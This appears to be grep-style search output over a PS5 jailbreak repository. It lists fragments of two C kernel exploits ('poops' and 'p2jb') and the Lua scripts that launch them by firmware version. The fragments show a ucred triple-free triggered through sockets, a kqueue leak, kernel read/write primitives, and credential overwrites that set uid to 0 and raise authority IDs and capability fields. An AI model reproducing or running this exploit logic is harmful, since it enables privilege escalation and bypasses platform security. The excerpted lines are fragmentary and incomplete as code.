@@ -1,0 +1,182 @@
+jit_shellcode/poops/poops.c:92:typedef s32  (*socket_t)           (s32 domain, s32 type, s32 proto);
+jit_shellcode/poops/poops.c:93:typedef s32  (*socketpair_t)       (s32 domain, s32 type, s32 proto, s32 *sv);
+jit_shellcode/poops/poops.c:98:typedef s32  (*kqueue_t)           (void);
+jit_shellcode/poops/poops.c:149:    socket_t              fn_socket;
+jit_shellcode/poops/poops.c:150:    socketpair_t          fn_socketpair;
+jit_shellcode/poops/poops.c:155:    kqueue_t              fn_kqueue;
+jit_shellcode/poops/poops.c:227:    s32  triplets[3];
+jit_shellcode/poops/poops.c:593:static s32 find_triplet(exploit_ctx_t *ctx, s32 master, s32 other)
+jit_shellcode/poops/poops.c:614:static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
+jit_shellcode/poops/poops.c:630:    CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->uio_ss, 0, 0);
+jit_shellcode/poops/poops.c:631:    CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->iov_ss, 0, 0);
+jit_shellcode/poops/poops.c:672:    s32 dummy_sock = (s32)CALL(ctx, fn_socket,
+jit_shellcode/poops/poops.c:693:    ctx->uaf_sock = (s32)CALL(ctx, fn_socket,
+jit_shellcode/poops/poops.c:742:    ctx->triplets[0] = ctx->twins[0];
+jit_shellcode/poops/poops.c:748:    s32 ret = find_triplet(ctx, ctx->triplets[0], -1);
+jit_shellcode/poops/poops.c:749:    if (ret < 0) { LOG(ctx, "triplets not found\n"); return 0; }
+jit_shellcode/poops/poops.c:750:    ctx->triplets[1] = ret;
+jit_shellcode/poops/poops.c:754:    ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
+jit_shellcode/poops/poops.c:755:    if (ret < 0) { LOG(ctx, "triplets not found\n"); return 0; }
+jit_shellcode/poops/poops.c:756:    ctx->triplets[2] = ret;
+jit_shellcode/poops/poops.c:761:    LOG(ctx, "triplets found\n");
+jit_shellcode/poops/poops.c:762:    log_hex32(ctx, "triplets[0] fd=", (u32)ctx->ipv6_socks[ctx->triplets[0]]);
+jit_shellcode/poops/poops.c:763:    log_hex32(ctx, "triplets[1] fd=", (u32)ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/poops/poops.c:764:    log_hex32(ctx, "triplets[2] fd=", (u32)ctx->ipv6_socks[ctx->triplets[2]]);
+jit_shellcode/poops/poops.c:768:static s32 leak_kqueue(exploit_ctx_t *ctx)
+jit_shellcode/poops/poops.c:771:    log_hex32(ctx, "leakKqueue: free triplets[1] fd=",
+jit_shellcode/poops/poops.c:772:              (u32)ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/poops/poops.c:774:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/poops/poops.c:779:        kq = (s32)CALL(ctx, fn_kqueue, 0, 0, 0, 0, 0, 0);
+jit_shellcode/poops/poops.c:782:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/poops/poops.c:814:    s32 ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[2]);
+jit_shellcode/poops/poops.c:815:    if (ret < 0) { LOG(ctx, "leakKqueue: triplet not found\n"); return 0; }
+jit_shellcode/poops/poops.c:816:    ctx->triplets[1] = ret;
+jit_shellcode/poops/poops.c:817:    log_hex32(ctx, "leakKqueue: new triplets[1] fd=",
+jit_shellcode/poops/poops.c:818:              (u32)ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/poops/poops.c:853:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/poops/poops.c:860:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/poops/poops.c:876:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[2]]);
+jit_shellcode/poops/poops.c:883:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/poops/poops.c:900:            ctx->triplets[1] = find_triplet(ctx, ctx->triplets[0], -1);
+jit_shellcode/poops/poops.c:907:    ctx->triplets[2] = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
+jit_shellcode/poops/poops.c:928:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/poops/poops.c:935:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/poops/poops.c:948:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[2]]);
+jit_shellcode/poops/poops.c:955:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/poops/poops.c:968:    ctx->triplets[1] = find_triplet(ctx, ctx->triplets[0], -1);
+jit_shellcode/poops/poops.c:972:    ctx->triplets[2] = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
+jit_shellcode/poops/poops.c:1009:static void remove_rthr_from_socket(exploit_ctx_t *ctx, s32 fd)
+jit_shellcode/poops/poops.c:1028:        s32 s = (s32)CALL(ctx, fn_socket, AF_UNIX, SOCK_STREAM, 0, 0, 0, 0);
+jit_shellcode/poops/poops.c:1041:    u64 p_ucred = kread64(ctx, p + 0x40);
+jit_shellcode/poops/poops.c:1043:    kwrite32(ctx, p_ucred + 0x04, 0);  
+jit_shellcode/poops/poops.c:1044:    kwrite32(ctx, p_ucred + 0x08, 0);  
+jit_shellcode/poops/poops.c:1045:    kwrite32(ctx, p_ucred + 0x0C, 0);  
+jit_shellcode/poops/poops.c:1046:    kwrite32(ctx, p_ucred + 0x10, 1);  
+jit_shellcode/poops/poops.c:1047:    kwrite32(ctx, p_ucred + 0x14, 0);  
+jit_shellcode/poops/poops.c:1048:    kwrite32(ctx, p_ucred + 0x18, 0);  
+jit_shellcode/poops/poops.c:1050:    kwrite64(ctx, p_ucred + 0x58, SYSCORE_AUTHID);          
+jit_shellcode/poops/poops.c:1051:    kwrite64(ctx, p_ucred + 0x60, 0xFFFFFFFFFFFFFFFFULL);   
+jit_shellcode/poops/poops.c:1052:    kwrite64(ctx, p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFULL);   
+jit_shellcode/poops/poops.c:1054:    log_hex32(ctx, "pre-patch ucred+0x82=", kread8(ctx, p_ucred + 0x82));
+jit_shellcode/poops/poops.c:1056:    kwrite8 (ctx, p_ucred + 0x82, 0x00);  // This is ps2emu exclusive patch to bypass socket restriction
+jit_shellcode/poops/poops.c:1057:    kwrite8 (ctx, p_ucred + 0x83, 0x80);                    
+jit_shellcode/poops/poops.c:1383:    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "socket",             (void**)&ctx.fn_socket);
+jit_shellcode/poops/poops.c:1384:    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "socketpair",         (void**)&ctx.fn_socketpair);
+jit_shellcode/poops/poops.c:1390:    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "kqueue",             (void**)&ctx.fn_kqueue);
+jit_shellcode/poops/poops.c:1468:    if (!trigger_ucred_triple_free(&ctx)) {
+jit_shellcode/poops/poops.c:1475:    if (!leak_kqueue(&ctx)) {
+jit_shellcode/poops/poops.c:1515:    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[0]]);
+jit_shellcode/poops/poops.c:1516:    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[1]]);
+jit_shellcode/poops/poops.c:1517:    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[2]]);
+jit_shellcode/poops/poops.c:1526:        u64 p_ucred = kread64(&ctx, ctx.curproc + 0x40);
+jit_shellcode/poops/poops.c:1527:        log_hex64(&ctx, "exploit: p_ucred=",      p_ucred);
+jit_shellcode/poops/poops.c:1528:        log_hex32(&ctx, "exploit: cr_uid=",        kread32(&ctx, p_ucred + 0x04));
+jit_shellcode/poops/poops.c:1529:        log_hex64(&ctx, "exploit: cr_sceAuthId=",  kread64(&ctx, p_ucred + 0x58));
+jit_shellcode/poops/poops.c:1535:        u64 p_ucred = kread64(&ctx, ctx.curproc + 0x40);
+jit_shellcode/poops/poops.c:1536:        log_hex32(&ctx, "exploit: post cr_uid=",       kread32(&ctx, p_ucred + 0x04));
+jit_shellcode/poops/poops.c:1537:        log_hex64(&ctx, "exploit: post cr_sceAuthId=", kread64(&ctx, p_ucred + 0x58));
+jit_shellcode/p2jb/p2jb.c:97:typedef s32  (*socket_t)           (s32 domain, s32 type, s32 proto);
+jit_shellcode/p2jb/p2jb.c:98:typedef s32  (*socketpair_t)       (s32 domain, s32 type, s32 proto, s32 *sv);
+jit_shellcode/p2jb/p2jb.c:103:typedef s32  (*kqueue_t)           (void);
+jit_shellcode/p2jb/p2jb.c:118:typedef s32  (*kqueueex_t)         (const char *name, s32 flags);
+jit_shellcode/p2jb/p2jb.c:155:    socket_t              fn_socket;
+jit_shellcode/p2jb/p2jb.c:156:    socketpair_t          fn_socketpair;
+jit_shellcode/p2jb/p2jb.c:161:    kqueue_t              fn_kqueue;
+jit_shellcode/p2jb/p2jb.c:176:    kqueueex_t            fn_kqueueex;
+jit_shellcode/p2jb/p2jb.c:235:    s32  triplets[3];
+jit_shellcode/p2jb/p2jb.c:287:static u64 syscall_wrap(void *gadget, void *syscall_stub,
+jit_shellcode/p2jb/p2jb.c:309:    syscall_wrap((ctx)->gadget, \
+jit_shellcode/p2jb/p2jb.c:665:        CALL(ctx, fn_kqueueex, KQUEUEEX_INVALID_PTR, 0, 0, 0, 0, 0);
+jit_shellcode/p2jb/p2jb.c:715:static s32 find_triplet(exploit_ctx_t *ctx, s32 master, s32 other)
+jit_shellcode/p2jb/p2jb.c:789:    ctx->triplets[0] = ctx->twins[0];
+jit_shellcode/p2jb/p2jb.c:794:    s32 ret = find_triplet(ctx, ctx->triplets[0], -1);
+jit_shellcode/p2jb/p2jb.c:795:    if (ret < 0) { LOG(ctx, "attempt_race: triplets[1] not found\n"); return 0; }
+jit_shellcode/p2jb/p2jb.c:796:    ctx->triplets[1] = ret;
+jit_shellcode/p2jb/p2jb.c:800:    ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
+jit_shellcode/p2jb/p2jb.c:804:        LOG(ctx, "attempt_race: triplets[2] not found\n");
+jit_shellcode/p2jb/p2jb.c:807:    ctx->triplets[2] = ret;
+jit_shellcode/p2jb/p2jb.c:814:static s32 trigger_ucred_triple_free(exploit_ctx_t *ctx)
+jit_shellcode/p2jb/p2jb.c:826:    CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->uio_ss, 0, 0);
+jit_shellcode/p2jb/p2jb.c:827:    CALL(ctx, fn_socketpair, AF_UNIX, SOCK_STREAM, 0, (u64)ctx->iov_ss, 0, 0);
+jit_shellcode/p2jb/p2jb.c:909:        CALL(ctx, fn_kqueueex, KQUEUEEX_INVALID_PTR, 0, 0, 0, 0, 0);
+jit_shellcode/p2jb/p2jb.c:936:    LOG(ctx, "tctf: triplets found\n");
+jit_shellcode/p2jb/p2jb.c:937:    log_hex32(ctx, "tctf: triplets[0] fd=", (u32)ctx->ipv6_socks[ctx->triplets[0]]);
+jit_shellcode/p2jb/p2jb.c:938:    log_hex32(ctx, "tctf: triplets[1] fd=", (u32)ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/p2jb/p2jb.c:939:    log_hex32(ctx, "tctf: triplets[2] fd=", (u32)ctx->ipv6_socks[ctx->triplets[2]]);
+jit_shellcode/p2jb/p2jb.c:943:static s32 leak_kqueue(exploit_ctx_t *ctx)
+jit_shellcode/p2jb/p2jb.c:946:    log_hex32(ctx, "leakKqueue: free triplets[1] fd=",
+jit_shellcode/p2jb/p2jb.c:947:              (u32)ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/p2jb/p2jb.c:949:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/p2jb/p2jb.c:954:        kq = (s32)CALL(ctx, fn_kqueue, 0, 0, 0, 0, 0, 0);
+jit_shellcode/p2jb/p2jb.c:957:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/p2jb/p2jb.c:989:    s32 ret = find_triplet(ctx, ctx->triplets[0], ctx->triplets[2]);
+jit_shellcode/p2jb/p2jb.c:990:    if (ret < 0) { LOG(ctx, "leakKqueue: triplet not found\n"); return 0; }
+jit_shellcode/p2jb/p2jb.c:991:    ctx->triplets[1] = ret;
+jit_shellcode/p2jb/p2jb.c:992:    log_hex32(ctx, "leakKqueue: new triplets[1] fd=",
+jit_shellcode/p2jb/p2jb.c:993:              (u32)ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/p2jb/p2jb.c:1028:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/p2jb/p2jb.c:1035:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/p2jb/p2jb.c:1051:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[2]]);
+jit_shellcode/p2jb/p2jb.c:1058:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/p2jb/p2jb.c:1075:            ctx->triplets[1] = find_triplet(ctx, ctx->triplets[0], -1);
+jit_shellcode/p2jb/p2jb.c:1082:    ctx->triplets[2] = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
+jit_shellcode/p2jb/p2jb.c:1103:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[1]]);
+jit_shellcode/p2jb/p2jb.c:1110:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/p2jb/p2jb.c:1123:    free_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[2]]);
+jit_shellcode/p2jb/p2jb.c:1130:        get_rthdr(ctx, ctx->ipv6_socks[ctx->triplets[0]],
+jit_shellcode/p2jb/p2jb.c:1143:    ctx->triplets[1] = find_triplet(ctx, ctx->triplets[0], -1);
+jit_shellcode/p2jb/p2jb.c:1147:    ctx->triplets[2] = find_triplet(ctx, ctx->triplets[0], ctx->triplets[1]);
+jit_shellcode/p2jb/p2jb.c:1184:static void remove_rthr_from_socket(exploit_ctx_t *ctx, s32 fd)
+jit_shellcode/p2jb/p2jb.c:1198:    u64 p_ucred = kread64(ctx, p + 0x40);
+jit_shellcode/p2jb/p2jb.c:1200:    kwrite32(ctx, p_ucred + 0x04, 0);  
+jit_shellcode/p2jb/p2jb.c:1201:    kwrite32(ctx, p_ucred + 0x08, 0);  
+jit_shellcode/p2jb/p2jb.c:1202:    kwrite32(ctx, p_ucred + 0x0C, 0);  
+jit_shellcode/p2jb/p2jb.c:1203:    kwrite32(ctx, p_ucred + 0x10, 1);  
+jit_shellcode/p2jb/p2jb.c:1204:    kwrite32(ctx, p_ucred + 0x14, 0);  
+jit_shellcode/p2jb/p2jb.c:1205:    kwrite32(ctx, p_ucred + 0x18, 0);  
+jit_shellcode/p2jb/p2jb.c:1207:    kwrite64(ctx, p_ucred + 0x58, SYSCORE_AUTHID);          
+jit_shellcode/p2jb/p2jb.c:1208:    kwrite64(ctx, p_ucred + 0x60, 0xFFFFFFFFFFFFFFFFULL);   
+jit_shellcode/p2jb/p2jb.c:1209:    kwrite64(ctx, p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFULL);   
+jit_shellcode/p2jb/p2jb.c:1211:    log_hex32(ctx, "pre-patch ucred+0x82=", kread8(ctx, p_ucred + 0x82));
+jit_shellcode/p2jb/p2jb.c:1213:    kwrite8 (ctx, p_ucred + 0x82, 0x00);  // This is ps2emu exclusive patch to bypass socket restriction
+jit_shellcode/p2jb/p2jb.c:1214:    kwrite8 (ctx, p_ucred + 0x83, 0x80);                    
+jit_shellcode/p2jb/p2jb.c:1540:    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "socket",             (void**)&ctx.fn_socket);
+jit_shellcode/p2jb/p2jb.c:1541:    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "socketpair",         (void**)&ctx.fn_socketpair);
+jit_shellcode/p2jb/p2jb.c:1547:    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "kqueue",             (void**)&ctx.fn_kqueue);
+jit_shellcode/p2jb/p2jb.c:1567:    resolve(ctx.gadget, dlsym, LIBKERNEL_HANDLE, "__sys_kqueueex",      (void**)&ctx.fn_kqueueex);
+jit_shellcode/p2jb/p2jb.c:1627:    if (!trigger_ucred_triple_free(&ctx)) {
+jit_shellcode/p2jb/p2jb.c:1634:    if (!leak_kqueue(&ctx)) {
+jit_shellcode/p2jb/p2jb.c:1686:    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[0]]);
+jit_shellcode/p2jb/p2jb.c:1687:    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[1]]);
+jit_shellcode/p2jb/p2jb.c:1688:    remove_rthr_from_socket(&ctx, ctx.ipv6_socks[ctx.triplets[2]]);
+jit_shellcode/p2jb/p2jb.c:1695:        u64 p_ucred = kread64(&ctx, ctx.curproc + 0x40);
+jit_shellcode/p2jb/p2jb.c:1696:        log_hex64(&ctx, "exploit: p_ucred=",      p_ucred);
+jit_shellcode/p2jb/p2jb.c:1697:        log_hex32(&ctx, "exploit: cr_uid=",        kread32(&ctx, p_ucred + 0x04));
+jit_shellcode/p2jb/p2jb.c:1698:        log_hex64(&ctx, "exploit: cr_sceAuthId=",  kread64(&ctx, p_ucred + 0x58));
+jit_shellcode/p2jb/p2jb.c:1704:        u64 p_ucred = kread64(&ctx, ctx.curproc + 0x40);
+jit_shellcode/p2jb/p2jb.c:1705:        log_hex32(&ctx, "exploit: post cr_uid=",       kread32(&ctx, p_ucred + 0x04));
+jit_shellcode/p2jb/p2jb.c:1706:        log_hex64(&ctx, "exploit: post cr_sceAuthId=", kread64(&ctx, p_ucred + 0x58));
+payloads/p2jb.lua:20:    if PLATFORM ~= "PS5" then
+payloads/p2jb.lua:25:    if tonumber(FW_VERSION) > 12.70 then
+payloads/p2jb.lua:26:        send_notification("Unsupported fw " .. FW_VERSION)
+payloads/p2jb.lua:37:        send_notification("Restart your PS5 to run exploit again");
+payloads/p2jb.lua:52:    write64(arg1,     EBOOT_BASE)
+payloads/p2jb.lua:53:    write64(arg1 + 8, SCE_KERNEL_DLSYM)
+payloads/p2jb.lua:68:        local fd = create_socket(AF_INET6, SOCK_STREAM, 0)
+payloads/p2jb.lua:70:            error(string.format("create_socket failed at index %d", i))
+payloads/p2jb.lua:88:                version_string, p2jb_version_string, PLATFORM, FW_VERSION, lua_network_str, elf_network_str))
+payloads/poops.lua:20:    if PLATFORM ~= "PS5" then
+payloads/poops.lua:25:    if tonumber(FW_VERSION) < 4.03 or tonumber(FW_VERSION) > 12.00 then
+payloads/poops.lua:26:        send_notification("Unsupported fw " .. FW_VERSION)
+payloads/poops.lua:37:        send_notification("Restart your PS5 to run exploit again");
+payloads/poops.lua:52:    write64(arg1,     EBOOT_BASE)
+payloads/poops.lua:53:    write64(arg1 + 8, SCE_KERNEL_DLSYM)
+payloads/poops.lua:68:        local fd = create_socket(AF_INET6, SOCK_STREAM, 0)
+payloads/poops.lua:70:            error(string.format("create_socket failed at index %d", i))
+payloads/poops.lua:86:                version_string, poops_version_string, PLATFORM, FW_VERSION, lua_network_str, elf_network_str))
+payloads/setlogserver.lua:15:        syscall.close(log_sock)
+payloads/setlogserver.lua:21:    log_sock = create_socket(AF_INET, SOCK_DGRAM, 0)
+payloads/setlogserver.lua:23:        error("create_socket failed")
+payloads/setlogserver.lua:35:        syscall.sendto(log_sock, s, #s, 0, log_addr, 16)
+payloads/shellcode_test3.lua:12:local read_addr = dlsym_shellcode_test(EBOOT_BASE, SCE_KERNEL_DLSYM)
+payloads/shellcode_test3.lua:14:send_notification("read function address in libkernel : ".. to_hex(read_addr))
